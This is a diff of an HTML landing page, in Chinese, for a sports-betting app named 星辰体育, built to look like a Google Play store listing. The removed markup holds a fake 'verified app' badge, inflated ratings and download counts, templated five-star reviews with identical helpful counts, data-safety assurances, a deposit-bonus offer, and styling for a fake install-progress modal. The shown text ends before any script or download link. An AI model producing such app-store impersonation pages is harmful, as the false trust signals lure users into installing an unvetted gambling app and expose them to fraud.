@@ -1,1392 +1,14 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>星辰体育</title>
-    <link rel="manifest" href="/manifest.json" />
-    <meta name="theme-color" content="#e8f5e9" />
-    <link rel="apple-touch-icon" href="images/logo.jpg" />
+    <link rel="stylesheet" href="css/main.css">
+    <link rel="manifest" href="/manifest.json">
+    <meta name="theme-color" content="#e8f5e9">
+    <link rel="apple-touch-icon" href="images/logo.jpg">
 
-    <!-- ===== 内联所有样式（自包含） ===== -->
-    <style>
-        /* ---------- 全局重置 ---------- */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            -webkit-tap-highlight-color: transparent;
-        }
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            background: #f8f9fa;
-            color: #202124;
-            padding-bottom: 72px;
-            /* 为底部导航留空间 */;
-        }
-        img {
-            display: block;
-            max-width: 100%;
-        }
-        button {
-            cursor: pointer;
-            border: none;
-            background: none;
-            font: inherit;
-        }
-
-        /* ---------- 顶部栏 ---------- */
-        .top-bar {
-            height: 6px;
-            background: linear-gradient(90deg, #ea4335, #fbbc04, #34a853, #4285f4);
-        }
-
-        /* ---------- App 头部 ---------- */
-        .app-header {
-            display: flex;
-            align-items: center;
-            gap: 14px;
-            padding: 18px 20px 12px;
-            background: #fff;
-            border-bottom: 1px solid #e8eaed;
-        }
-        .app-icon {
-            flex: 0 0 72px;
-            width: 72px;
-            height: 72px;
-            border-radius: 18px;
-            overflow: hidden;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.12);
-            background: #fff;
-        }
-        .app-icon img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        .app-info {
-            flex: 1;
-            min-width: 0;
-        }
-        .app-info h1 {
-            font-size: 22px;
-            font-weight: 600;
-            letter-spacing: -0.3px;
-            color: #202124;
-            line-height: 1.2;
-        }
-        .developer {
-            font-size: 14px;
-            color: #5f6368;
-            margin-top: 2px;
-        }
-        .verified {
-            display: inline-flex;
-            align-items: center;
-            gap: 4px;
-            font-size: 12px;
-            color: #1a73e8;
-            background: #e8f0fe;
-            padding: 2px 10px 2px 6px;
-            border-radius: 12px;
-            margin-top: 4px;
-            font-weight: 500;
-        }
-        .verified svg {
-            width: 16px;
-            height: 16px;
-            fill: #1a73e8;
-        }
-
-        /* ---------- 统计行 ---------- */
-        .stats-row {
-            display: flex;
-            background: #fff;
-            padding: 8px 20px 14px;
-            border-bottom: 1px solid #e8eaed;
-            gap: 16px;
-            flex-wrap: wrap;
-        }
-        .stat-item {
-            flex: 1;
-            min-width: 60px;
-        }
-        .stat-value {
-            font-size: 18px;
-            font-weight: 600;
-            color: #202124;
-            display: flex;
-            align-items: center;
-            gap: 2px;
-        }
-        .stat-value .star {
-            font-size: 14px;
-            color: #f9ab00;
-        }
-        .stat-label {
-            font-size: 12px;
-            color: #5f6368;
-            margin-top: 1px;
-        }
-        .badge-18 {
-            display: inline-block;
-            background: #e8eaed;
-            padding: 0 6px;
-            border-radius: 4px;
-            font-size: 13px;
-            font-weight: 600;
-            color: #3c4043;
-            line-height: 20px;
-        }
-
-        /* ---------- 安装按钮 ---------- */
-        .install-section {
-            background: #fff;
-            padding: 8px 20px 14px;
-            border-bottom: 1px solid #e8eaed;
-            display: flex;
-            align-items: center;
-            gap: 16px;
-            flex-wrap: wrap;
-        }
-        .install-btn {
-            background: #1a73e8;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 600;
-            padding: 10px 32px;
-            border-radius: 24px;
-            transition: background 0.2s, transform 0.15s;
-            box-shadow: 0 2px 8px rgba(26, 115, 232, 0.3);
-            flex: 1;
-            max-width: 220px;
-            text-align: center;
-        }
-        .install-btn:active {
-            transform: scale(0.96);
-            background: #1557b0;
-        }
-        .install-hint {
-            font-size: 13px;
-            color: #5f6368;
-        }
-
-        /* ---------- 操作行 ---------- */
-        .action-row {
-            display: flex;
-            background: #fff;
-            padding: 4px 20px 14px;
-            border-bottom: 1px solid #e8eaed;
-            gap: 28px;
-        }
-        .action-item {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 14px;
-            color: #3c4043;
-            font-weight: 500;
-            padding: 4px 0;
-            cursor: pointer;
-            transition: opacity 0.2s;
-        }
-        .action-item:active {
-            opacity: 0.5;
-        }
-        .action-item svg {
-            width: 20px;
-            height: 20px;
-            fill: #5f6368;
-        }
-
-        /* ---------- 轮播图 ---------- */
-        .promo-banner.carousel {
-            position: relative;
-            overflow: hidden;
-            background: #fff;
-            margin: 12px 16px 0;
-            border-radius: 16px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.06);
-            touch-action: pan-y;
-        }
-        .carousel-track {
-            display: flex;
-            transition: transform 0.45s cubic-bezier(0.25, 0.46, 0.45, 0.94);
-            will-change: transform;
-            width: 500%;
-            /* 5张图片 = 500% */;
-        }
-        .carousel-slide {
-            flex: 0 0 20%;
-            /* 100% / 5 */;
-            aspect-ratio: 16 / 7;
-            overflow: hidden;
-            background: #e8eaed;
-        }
-        .carousel-slide img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            display: block;
-            pointer-events: none;
-            user-select: none;
-        }
-        /* 指示点容器 */
-        .carousel-dots {
-            display: flex;
-            justify-content: center;
-            gap: 7px;
-            padding: 12px 0 14px;
-            background: #fff;
-            border-radius: 0 0 16px 16px;
-        }
-        .dot {
-            width: 8px;
-            height: 8px;
-            border-radius: 50%;
-            background: #dadce0;
-            transition: background 0.25s, transform 0.2s;
-            cursor: pointer;
-            flex-shrink: 0;
-        }
-        .dot.active {
-            background: #1a73e8;
-            transform: scale(1.25);
-        }
-        .dot:active {
-            transform: scale(0.85);
-        }
-
-        /* ---------- 通用 Section ---------- */
-        .section {
-            background: #fff;
-            margin: 12px 16px 0;
-            padding: 16px 18px 18px;
-            border-radius: 16px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
-        }
-        .section-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 10px;
-        }
-        .section-header h3 {
-            font-size: 17px;
-            font-weight: 600;
-            color: #202124;
-        }
-        .section-header .arrow {
-            font-size: 18px;
-            color: #5f6368;
-            cursor: default;
-        }
-        .section p {
-            font-size: 14px;
-            line-height: 1.6;
-            color: #3c4043;
-        }
-        .updated-info {
-            display: flex;
-            justify-content: space-between;
-            padding-top: 14px;
-            margin-top: 14px;
-            border-top: 1px solid #e8eaed;
-            font-size: 14px;
-        }
-        .updated-info .label {
-            color: #5f6368;
-        }
-        .updated-info .value {
-            color: #202124;
-            font-weight: 500;
-        }
-        .tags {
-            display: flex;
-            gap: 8px;
-            margin-top: 12px;
-            flex-wrap: wrap;
-        }
-        .tag {
-            background: #f1f3f4;
-            padding: 4px 14px;
-            border-radius: 14px;
-            font-size: 13px;
-            color: #3c4043;
-        }
-
-        /* ---------- 数据安全 ---------- */
-        .data-safety {
-            background: #fff;
-            margin: 0 16px 0;
-            padding: 0 18px 18px;
-            border-radius: 0 0 16px 16px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
-            margin-bottom: 4px;
-        }
-        .data-item {
-            display: flex;
-            align-items: flex-start;
-            gap: 14px;
-            padding: 12px 0;
-            border-bottom: 1px solid #f1f3f4;
-        }
-        .data-item:last-child {
-            border-bottom: none;
-        }
-        .data-icon {
-            flex: 0 0 24px;
-            width: 24px;
-            height: 24px;
-            margin-top: 2px;
-        }
-        .data-icon svg {
-            width: 100%;
-            height: 100%;
-            fill: #5f6368;
-        }
-        .data-text {
-            font-size: 14px;
-            color: #3c4043;
-            line-height: 1.5;
-        }
-        .data-text strong {
-            color: #202124;
-        }
-
-        /* ---------- 评分评价 ---------- */
-        .ratings-section {
-            background: #fff;
-            margin: 12px 16px 0;
-            padding: 16px 18px 6px;
-            border-radius: 16px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
-        }
-        .ratings-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-        .ratings-header h3 {
-            font-size: 17px;
-            font-weight: 600;
-            color: #202124;
-        }
-        .ratings-subtitle {
-            font-size: 13px;
-            color: #5f6368;
-            margin: -4px 0 12px;
-        }
-        .ratings-overview {
-            display: flex;
-            gap: 24px;
-            align-items: center;
-            flex-wrap: wrap;
-        }
-        .big-rating {
-            font-size: 40px;
-            font-weight: 600;
-            color: #202124;
-            line-height: 1;
-        }
-        .star-icons {
-            font-size: 20px;
-            color: #f9ab00;
-            letter-spacing: 1px;
-            margin: 2px 0;
-        }
-        .rating-count {
-            font-size: 13px;
-            color: #5f6368;
-        }
-        .stars-breakdown {
-            flex: 1;
-            min-width: 120px;
-        }
-        .star-row {
-            display: flex;
-            align-items: center;
-            gap: 6px;
-            font-size: 13px;
-            color: #3c4043;
-            padding: 1px 0;
-        }
-        .star-row .num {
-            width: 16px;
-            text-align: right;
-            font-weight: 500;
-        }
-        .star-bar {
-            flex: 1;
-            height: 6px;
-            background: #e8eaed;
-            border-radius: 3px;
-            overflow: hidden;
-        }
-        .star-bar .fill {
-            height: 100%;
-            background: #f9ab00;
-            border-radius: 3px;
-        }
-
-        /* 单条评价 */
-        .review {
-            padding: 14px 0 8px;
-            border-bottom: 1px solid #f1f3f4;
-        }
-        .review:last-of-type {
-            border-bottom: none;
-        }
-        .review-header {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        .avatar {
-            width: 32px;
-            height: 32px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            font-weight: 600;
-            font-size: 14px;
-            flex-shrink: 0;
-        }
-        .review-name {
-            font-weight: 500;
-            color: #202124;
-            font-size: 14px;
-        }
-        .review-menu {
-            margin-left: auto;
-            color: #5f6368;
-            font-size: 18px;
-            cursor: default;
-        }
-        .review-stars-date {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            margin: 4px 0 4px 42px;
-        }
-        .review-stars {
-            color: #f9ab00;
-            font-size: 16px;
-            letter-spacing: 1px;
-        }
-        .review-date {
-            font-size: 12px;
-            color: #5f6368;
-        }
-        .review-text {
-            font-size: 14px;
-            line-height: 1.5;
-            color: #3c4043;
-            margin: 4px 0 2px 42px;
-        }
-        .review-helpful {
-            font-size: 12px;
-            color: #5f6368;
-            margin: 2px 0 6px 42px;
-        }
-        .review-actions {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 13px;
-            color: #5f6368;
-            margin-left: 42px;
-            flex-wrap: wrap;
-        }
-        .helpful-btn {
-            background: #f1f3f4;
-            padding: 2px 14px;
-            border-radius: 12px;
-            font-size: 13px;
-            color: #3c4043;
-            transition: background 0.2s;
-        }
-        .helpful-btn:active {
-            background: #dadce0;
-        }
-        .view-all-btn {
-            display: block;
-            width: 100%;
-            text-align: center;
-            padding: 12px 0;
-            margin: 8px 0 4px;
-            font-size: 15px;
-            font-weight: 500;
-            color: #1a73e8;
-            border-top: 1px solid #e8eaed;
-            transition: background 0.2s;
-            border-radius: 0 0 16px 16px;
-        }
-        .view-all-btn:active {
-            background: #f1f3f4;
-        }
-
-        /* ---------- 新功能 ---------- */
-        .whats-new {
-            background: #fff;
-            margin: 12px 16px 0;
-            padding: 16px 18px 18px;
-            border-radius: 16px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.04);
-        }
-        .whats-new h3 {
-            font-size: 17px;
-            font-weight: 600;
-            color: #202124;
-            margin-bottom: 6px;
-        }
-        .whats-new p {
-            font-size: 14px;
-            color: #3c4043;
-            line-height: 1.6;
-        }
-        .whats-new ul {
-            padding-left: 20px;
-            margin: 4px 0 2px;
-        }
-        .whats-new ul li {
-            font-size: 14px;
-            color: #3c4043;
-            line-height: 1.6;
-        }
-
-        /* ---------- 底部链接 ---------- */
-        .footer-links {
-            display: flex;
-            flex-wrap: wrap;
-            justify-content: center;
-            gap: 8px 18px;
-            padding: 20px 16px 12px;
-            font-size: 13px;
-            color: #1a73e8;
-        }
-        .footer-link {
-            cursor: pointer;
-            padding: 2px 0;
-        }
-        .footer-link:active {
-            opacity: 0.6;
-        }
-
-        /* ---------- 国家选择 ---------- */
-        .country-selector {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 6px;
-            padding: 4px 0 16px;
-            font-size: 14px;
-            color: #3c4043;
-        }
-        .country-flag {
-            font-size: 20px;
-        }
-
-        /* ---------- 底部导航 ---------- */
-        .bottom-nav {
-            position: fixed;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            display: flex;
-            background: #fff;
-            border-top: 1px solid #e8eaed;
-            padding: 4px 0 env(safe-area-inset-bottom, 6px);
-            z-index: 100;
-            backdrop-filter: blur(4px);
-        }
-        .nav-item {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 1px;
-            padding: 6px 0 4px;
-            font-size: 11px;
-            color: #5f6368;
-            transition: color 0.2s;
-            cursor: pointer;
-            user-select: none;
-            border: none;
-            background: transparent;
-        }
-        .nav-item.active {
-            color: #1a73e8;
-        }
-        .nav-item:active {
-            opacity: 0.5;
-        }
-        .nav-item svg {
-            width: 26px;
-            height: 26px;
-            fill: currentColor;
-        }
-
-        /* ---------- Modal ---------- */
-        .modal-overlay {
-            position: fixed;
-            inset: 0;
-            background: rgba(0, 0, 0, 0.55);
-            backdrop-filter: blur(6px);
-            z-index: 200;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            visibility: hidden;
-            opacity: 0;
-            transition: opacity 0.3s, visibility 0.3s;
-            padding: 20px;
-        }
-        .modal-overlay.active {
-            visibility: visible;
-            opacity: 1;
-        }
-        .modal-box {
-            background: #fff;
-            border-radius: 32px;
-            padding: 32px 28px 28px;
-            max-width: 360px;
-            width: 100%;
-            text-align: center;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
-            transform: scale(0.92) translateY(20px);
-            transition: transform 0.35s cubic-bezier(0.34, 1.56, 0.64, 1), opacity 0.35s;
-            opacity: 0;
-        }
-        .modal-overlay.active .modal-box {
-            transform: scale(1) translateY(0);
-            opacity: 1;
-        }
-        .modal-logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-        .modal-logo-icon {
-            width: 44px;
-            height: 44px;
-            flex-shrink: 0;
-        }
-        .modal-logo-text {
-            font-size: 18px;
-            font-weight: 600;
-            color: #202124;
-            letter-spacing: 0.5px;
-        }
-
-        /* Loading 状态 */
-        .modal-loading {
-            display: flex;
-            justify-content: center;
-            padding: 8px 0 12px;
-        }
-        .spinner-wrap {
-            position: relative;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 16px;
-        }
-        .spinner {
-            width: 44px;
-            height: 44px;
-            border-radius: 50%;
-            border: 4px solid #e8eaed;
-            border-top-color: #1a73e8;
-            animation: spin 0.9s linear infinite;
-        }
-        @keyframes spin {
-            to {
-                transform: rotate(360deg);
-            }
-        }
-        .spinner-percent {
-            font-size: 22px;
-            font-weight: 600;
-            color: #202124;
-            min-width: 56px;
-            text-align: left;
-        }
-
-        /* Ready 状态 */
-        .modal-ready {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            gap: 16px;
-            padding-top: 4px;
-        }
-        .modal-box.ready .modal-loading {
-            display: none;
-        }
-        .modal-box.ready .modal-ready {
-            display: flex;
-        }
-        .effective-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 6px;
-            background: #e6f4ea;
-            color: #1e8e3e;
-            padding: 4px 14px 4px 10px;
-            border-radius: 20px;
-            font-size: 14px;
-            font-weight: 500;
-        }
-        .effective-badge svg {
-            width: 18px;
-            height: 18px;
-            fill: #1e8e3e;
-        }
-        .modal-install-btn {
-            background: #1a73e8;
-            color: #fff;
-            font-size: 17px;
-            font-weight: 600;
-            padding: 12px 44px;
-            border-radius: 28px;
-            transition: background 0.2s, transform 0.15s;
-            box-shadow: 0 4px 16px rgba(26, 115, 232, 0.35);
-            width: 100%;
-            max-width: 240px;
-        }
-        .modal-install-btn:active {
-            transform: scale(0.96);
-            background: #1557b0;
-        }
-
-        /* ---------- 响应式微调 ---------- */
-        @media (max-width: 400px) {
-            .app-header {
-                padding: 14px 14px 10px;
-                gap: 10px;
-            }
-            .app-icon {
-                flex: 0 0 60px;
-                width: 60px;
-                height: 60px;
-                border-radius: 14px;
-            }
-            .app-info h1 {
-                font-size: 19px;
-            }
-            .install-btn {
-                font-size: 15px;
-                padding: 9px 20px;
-                max-width: 180px;
-            }
-            .stats-row {
-                padding: 6px 14px 10px;
-                gap: 10px;
-            }
-            .stat-value {
-                font-size: 16px;
-            }
-            .action-row {
-                gap: 16px;
-                padding: 2px 14px 10px;
-            }
-            .ratings-overview {
-                gap: 14px;
-            }
-            .big-rating {
-                font-size: 32px;
-            }
-            .modal-box {
-                padding: 24px 18px 22px;
-            }
-        }
-        @media (min-width: 600px) {
-            body {
-                max-width: 480px;
-                margin: 0 auto;
-                border-left: 1px solid #e8eaed;
-                border-right: 1px solid #e8eaed;
-                min-height: 100vh;
-                background: #fff;
-            }
-            .bottom-nav {
-                max-width: 480px;
-                left: 50%;
-                transform: translateX(-50%);
-                border-left: 1px solid #e8eaed;
-                border-right: 1px solid #e8eaed;
-            }
-        }
-    </style>
-</head>
-<body>
-
-    <!-- ===== 顶部彩色条 ===== -->
-    <div class="top-bar"></div>
-
-    <!-- ===== App 头部 ===== -->
-    <header class="app-header">
-        <div class="app-icon">
-            <img src="images/logo.jpg" alt="星辰体育 Logo" width="100%" height="100%" />
-        </div>
-        <div class="app-info">
-            <h1>星辰体育</h1>
-            <div class="developer">leiting.sports</div>
-            <div class="verified">
-                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
-                已通过应用验证
-            </div>
-        </div>
-    </header>
-
-    <!-- ===== 统计行 ===== -->
-    <div class="stats-row">
-        <div class="stat-item">
-            <div class="stat-value">4.9 <span class="star">★</span></div>
-            <div class="stat-label">4.6万 条评价</div>
-        </div>
-        <div class="stat-item">
-            <div class="stat-value">50万+</div>
-            <div class="stat-label">下载量</div>
-        </div>
-        <div class="stat-item">
-            <div class="stat-value"><span class="badge-18">18+</span></div>
-            <div class="stat-label">适用年龄</div>
-        </div>
-    </div>
-
-    <!-- ===== 安装按钮 ===== -->
-    <div class="install-section">
-        <button class="install-btn" id="mainInstallBtn">立即安装</button>
-        <div class="install-hint">10秒内即完成</div>
-    </div>
-
-    <!-- ===== 操作行 ===== -->
-    <div class="action-row">
-        <div class="action-item">
-            <svg viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92-1.31-2.92-2.92-2.92z"/></svg>
-            分享
-        </div>
-        <div class="action-item">
-            <svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zM6 20V4h7v5h5v11H6z"/></svg>
-            加入心愿单
-        </div>
-    </div>
-
-    <!-- ========================================================= -->
-    <!-- ===== ★ 轮播图 — 修复：5张图片 → 5个指示点 ===== -->
-    <!-- ========================================================= -->
-    <div class="promo-banner carousel" id="carousel">
-        <div class="carousel-track" id="carouselTrack">
-            <div class="carousel-slide"><img src="images/1.jpg" alt="活动1" loading="lazy" /></div>
-            <div class="carousel-slide"><img src="images/2.jpg" alt="活动2" loading="lazy" /></div>
-            <div class="carousel-slide"><img src="images/3.jpg" alt="活动3" loading="lazy" /></div>
-            <div class="carousel-slide"><img src="images/4.jpg" alt="活动4" loading="lazy" /></div>
-            <div class="carousel-slide"><img src="images/5.jpg" alt="活动5" loading="lazy" /></div>
-        </div>
-        <!-- 指示点：5 个，与图片数量一致 -->
-        <div class="carousel-dots" id="carouselDots">
-            <span class="dot" data-index="0"></span>
-            <span class="dot" data-index="1"></span>
-            <span class="dot active" data-index="2"></span>
-            <span class="dot" data-index="3"></span>
-            <span class="dot" data-index="4"></span>
-        </div>
-    </div>
-
-    <!-- ===== 关于此应用 ===== -->
-    <section class="section">
-        <div class="section-header">
-            <h3>关于此应用</h3>
-            <span class="arrow">➔</span>
-        </div>
-        <p>
-            超值回馈活动 - 火热进行中！充值100元，赠送88元！
-        </p>
-        <br />
-        <p>
-            2026年最热门的体育竞猜游戏！精彩的赛事直播，实时比分推送，专业的数据分析，让您尽享体育竞技的乐趣！同时还原真实的赛场氛围，提供沉浸式的互动体验。赢取丰厚奖励，畅享体育盛宴！
-        </p>
-        <div class="updated-info">
-            <span class="label">更新日期</span>
-            <span class="value">2025年2月10日</span>
-        </div>
-        <div class="tags">
-            <span class="tag">体育</span>
-            <span class="tag">竞猜</span>
-        </div>
-    </section>
-
-    <!-- ===== 数据安全 ===== -->
-    <section class="section" style="border-radius:16px 16px 0 0; margin-bottom:0; padding-bottom:12px;">
-        <div class="section-header">
-            <h3>数据安全</h3>
-            <span class="arrow">➔</span>
-        </div>
-        <p style="font-size:13px; color:#5f6368; margin-bottom:4px;">
-            您的数据安全取决于开发者如何收集和共享您的数据。数据隐私和安全措施可能因您的使用情况、所在地区和年龄而有所不同。以下信息由开发者提供，可能会随时间更新。
-        </p>
-    </section>
-    <div class="data-safety">
-        <div class="data-item">
-            <div class="data-icon">
-                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
-            </div>
-            <div class="data-text">
-                <strong>不会与第三方共享数据</strong><br />
-                了解开发者如何声明数据共享方式
-            </div>
-        </div>
-        <div class="data-item">
-            <div class="data-icon">
-                <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-7 3c1.93 0 3.5 1.57 3.5 3.5S13.93 13 12 13s-3.5-1.57-3.5-3.5S10.07 6 12 6zm7 13H5v-.23c0-.62.28-1.2.76-1.58C7.47 15.82 9.64 15 12 15s4.53.82 6.24 2.19c.48.38.76.97.76 1.58V19z"/></svg>
-            </div>
-            <div class="data-text">
-                此应用可能会收集以下类型的数据<br />
-                位置信息、应用活动记录和设备标识符等
-            </div>
-        </div>
-        <div class="data-item">
-            <div class="data-icon">
-                <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1s3.1 1.39 3.1 3.1v2z"/></svg>
-            </div>
-            <div class="data-text">
-                数据在传输过程中会加密
-            </div>
-        </div>
-        <div class="data-item">
-            <div class="data-icon">
-                <svg viewBox="0 0 24 24"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg>
-            </div>
-            <div class="data-text">
-                您可以请求删除数据
-            </div>
-        </div>
-    </div>
-
-    <!-- ===== 评分和评价 ===== -->
-    <section class="ratings-section">
-        <div class="ratings-header">
-            <h3>评分和评价</h3>
-            <span class="arrow" style="font-size:20px; color:#5f6368;">➔</span>
-        </div>
-        <div class="ratings-subtitle">评分和评价均经过验证</div>
-
-        <div class="ratings-overview">
-            <div>
-                <div class="big-rating">4.9</div>
-                <div class="star-icons">★★★★★</div>
-                <div class="rating-count">1.91万 条评价</div>
-            </div>
-            <div class="stars-breakdown">
-                <div class="star-row"><span class="num">5</span><div class="star-bar"><div class="fill" style="width:90%"></div></div></div>
-                <div class="star-row"><span class="num">4</span><div class="star-bar"><div class="fill" style="width:7%"></div></div></div>
-                <div class="star-row"><span class="num">3</span><div class="star-bar"><div class="fill" style="width:2%"></div></div></div>
-                <div class="star-row"><span class="num">2</span><div class="star-bar"><div class="fill" style="width:1%"></div></div></div>
-                <div class="star-row"><span class="num">1</span><div class="star-bar"><div class="fill" style="width:1%"></div></div></div>
-            </div>
-        </div>
-
-        <!-- 评价1 -->
-        <div class="review">
-            <div class="review-header">
-                <div class="avatar" style="background:#7b1fa2;">张</div>
-                <span class="review-name">张明华</span>
-                <span class="review-menu">⋮</span>
-            </div>
-            <div class="review-stars-date">
-                <span class="review-stars">★★★★★</span>
-                <span class="review-date">2024年9月5日</span>
-            </div>
-            <p class="review-text">这个应用非常好，赛事丰富，数据分析很专业。总体来说我很喜欢，是休闲放松的好选择！</p>
-            <p class="review-helpful">52人认为此评价有用</p>
-            <div class="review-actions">
-                <span>您觉得此评价有用吗？</span>
-                <button class="helpful-btn">是</button>
-                <button class="helpful-btn">否</button>
-            </div>
-        </div>
-
-        <!-- 评价2 -->
-        <div class="review">
-            <div class="review-header">
-                <div class="avatar" style="background:#1565c0;">李</div>
-                <span class="review-name">李晓燕</span>
-                <span class="review-menu">⋮</span>
-            </div>
-            <div class="review-stars-date">
-                <span class="review-stars">★★★★★</span>
-                <span class="review-date">2024年8月19日</span>
-            </div>
-            <p class="review-text">非常喜欢这个应用，赛事种类齐全，实时数据更新很快，每天都在用。</p>
-            <p class="review-helpful">52人认为此评价有用</p>
-            <div class="review-actions">
-                <span>您觉得此评价有用吗？</span>
-                <button class="helpful-btn">是</button>
-                <button class="helpful-btn">否</button>
-            </div>
-        </div>
-
-        <!-- 评价3 -->
-        <div class="review">
-            <div class="review-header">
-                <div class="avatar" style="background:#2e7d32;">王</div>
-                <span class="review-name">王建国</span>
-                <span class="review-menu">⋮</span>
-            </div>
-            <div class="review-stars-date">
-                <span class="review-stars">★★★★★</span>
-                <span class="review-date">2024年6月9日</span>
-            </div>
-            <p class="review-text">非常有趣，不会卡顿，内容丰富，界面清爽，非常好的体验。</p>
-            <p class="review-helpful">52人认为此评价有用</p>
-            <div class="review-actions">
-                <span>您觉得此评价有用吗？</span>
-                <button class="helpful-btn">是</button>
-                <button class="helpful-btn">否</button>
-            </div>
-        </div>
-
-        <button class="view-all-btn">查看所有评价</button>
-    </section>
-
-    <!-- ===== 新功能 ===== -->
-    <section class="whats-new">
-        <h3>新功能</h3>
-        <p>您好，星辰体育的粉丝们！<br />这里有一个新的更新：</p>
-        <ul>
-            <li>性能优化提升</li>
-        </ul>
-        <br />
-        <p>尽情享受吧！</p>
-    </section>
-
-    <!-- ===== 底部链接 ===== -->
-    <div class="footer-links">
-        <span class="footer-link">充值通行证</span>
-        <span class="footer-link">积分商城</span>
-        <span class="footer-link">礼品兑换</span>
-        <span class="footer-link">退款政策</span>
-    </div>
-
-    <!-- ===== 国家选择 ===== -->
-    <div class="country-selector">
-        <span class="country-flag">🇨🇳</span>
-        <span>中国（简体中文）</span>
-    </div>
-
-    <!-- ========================================================= -->
-    <!-- ===== 底部导航 ===== -->
-    <!-- ========================================================= -->
-    <nav class="bottom-nav">
-        <button class="nav-item active" data-tab="game">
-            <svg viewBox="0 0 24 24"><path d="M15 7.5V2H9v5.5l3 3 3-3zM7.5 9H2v6h5.5l3-3-3-3zM9 16.5V22h6v-5.5l-3-3-3 3zM16.5 9l-3 3 3 3H22V9h-5.5z"/></svg>
-            游戏
-        </button>
-        <button class="nav-item" data-tab="app">
-            <svg viewBox="0 0 24 24"><path d="M4 8h4V4H4v4zm6 12h4v-4h-4v4zm-6 0h4v-4H4v4zm0-6h4v-4H4v4zm6 0h4v-4h-4v4zm6-10v4h4V4h-4zm-6 4h4V4h-4v4zm6 6h4v-4h-4v4zm0 6h4v-4h-4v4z"/></svg>
-            应用
-        </button>
-        <button class="nav-item" data-tab="movie">
-            <svg viewBox="0 0 24 24"><path d="M18 4l2 4h-3l-2-4h-2l2 4h-3l-2-4H8l2 4H7L5 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4h-4z"/></svg>
-            影视
-        </button>
-        <button class="nav-item" data-tab="book">
-            <svg viewBox="0 0 24 24"><path d="M18 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zM6 4h5v8l-2.5-1.5L6 12V4z"/></svg>
-            图书
-        </button>
-        <button class="nav-item" data-tab="kids">
-            <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
-            少儿
-        </button>
-    </nav>
-
-    <!-- ========================================================= -->
-    <!-- ===== Modal 弹窗 ===== -->
-    <!-- ========================================================= -->
-    <div class="modal-overlay" id="modal">
-        <div class="modal-box" id="modalBox">
-            <!-- Logo -->
